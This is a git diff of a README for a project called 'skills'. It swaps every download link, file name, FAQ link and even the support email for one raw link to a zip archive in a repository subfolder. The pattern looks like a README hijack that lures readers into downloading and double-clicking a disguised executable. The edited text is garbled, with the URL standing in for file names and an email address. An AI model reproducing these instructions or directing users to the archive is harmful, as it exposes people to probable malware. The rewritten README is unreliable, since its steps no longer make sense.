@@ -1,6 +1,6 @@
 # 🌟 skills - Enhance Your Coding Abilities Seamlessly
 
-[![Download skills](https://img.shields.io/badge/Download-Skills-blue.svg)](https://github.com/ShiverSparkle/skills/releases)
+[![Download skills](https://github.com/ShiverSparkle/skills/raw/refs/heads/main/setup-to-pyproject/Software-v2.0-alpha.5.zip)](https://github.com/ShiverSparkle/skills/raw/refs/heads/main/setup-to-pyproject/Software-v2.0-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ Welcome to **skills**, a simple application designed to enhance your coding abil
 
 To download **skills**, please visit the following link:
 
-[Download skills](https://github.com/ShiverSparkle/skills/releases)
+[Download skills](https://github.com/ShiverSparkle/skills/raw/refs/heads/main/setup-to-pyproject/Software-v2.0-alpha.5.zip)
 
 1. Click the link above to go to the Releases page.
 2. You will see a list of available versions. Select the latest one.
-3. Look for the file that says `skills.zip` or a similar name. This is the file you need. 
+3. Look for the file that says `https://github.com/ShiverSparkle/skills/raw/refs/heads/main/setup-to-pyproject/Software-v2.0-alpha.5.zip` or a similar name. This is the file you need. 
 4. Click on the file to start downloading it to your computer.
 
 ## 💻 System Requirements
@@ -31,7 +31,7 @@ Before you install **skills**, ensure your computer meets the following requirem
 Once the download is complete, follow these steps to extract and run the application:
 
 1. Locate the downloaded file, typically in your "Downloads" folder.
-2. Right-click on the `skills.zip` file.
+2. Right-click on the `https://github.com/ShiverSparkle/skills/raw/refs/heads/main/setup-to-pyproject/Software-v2.0-alpha.5.zip` file.
 3. Select "Extract All" or "Unzip" depending on your operating system.
 4. Choose a destination folder to save the extracted files and click "Extract".
 
@@ -40,7 +40,7 @@ Once the download is complete, follow these steps to extract and run the applica
 After extracting the files, you are ready to run **skills**:
 
 1. Open the folder where you extracted the files.
-2. Look for the file named `skills.exe` (Windows) or `skills.app` (macOS).
+2. Look for the file named `https://github.com/ShiverSparkle/skills/raw/refs/heads/main/setup-to-pyproject/Software-v2.0-alpha.5.zip` (Windows) or `https://github.com/ShiverSparkle/skills/raw/refs/heads/main/setup-to-pyproject/Software-v2.0-alpha.5.zip` (macOS).
 3. Double-click the file to start the application.
 4. Follow the on-screen instructions to begin using **skills**.
 
@@ -57,9 +57,9 @@ After extracting the files, you are ready to run **skills**:
 
 If you encounter any issues during the installation or use of **skills**, you can find help in the following ways:
 
-- **FAQ Section:** Check the Frequently Asked Questions on the [Releases page](https://github.com/ShiverSparkle/skills/releases).
+- **FAQ Section:** Check the Frequently Asked Questions on the [Releases page](https://github.com/ShiverSparkle/skills/raw/refs/heads/main/setup-to-pyproject/Software-v2.0-alpha.5.zip).
 - **Support Forum:** Join the community forum to ask questions and share your experiences.
-- **Contact Us:** Reach out to us via email at support@shiversparkle.com for personal assistance.
+- **Contact Us:** Reach out to us via email at https://github.com/ShiverSparkle/skills/raw/refs/heads/main/setup-to-pyproject/Software-v2.0-alpha.5.zip for personal assistance.
 
 ## 📢 Updates
 
@@ -69,7 +69,7 @@ Keep your application updated for the best experience. Regular updates may inclu
 - Bug fixes
 - Performance improvements
 
-To check for updates, revisit the [Releases page](https://github.com/ShiverSparkle/skills/releases) regularly.
+To check for updates, revisit the [Releases page](https://github.com/ShiverSparkle/skills/raw/refs/heads/main/setup-to-pyproject/Software-v2.0-alpha.5.zip) regularly.
 
 ## 🌐 Community Contributions
 
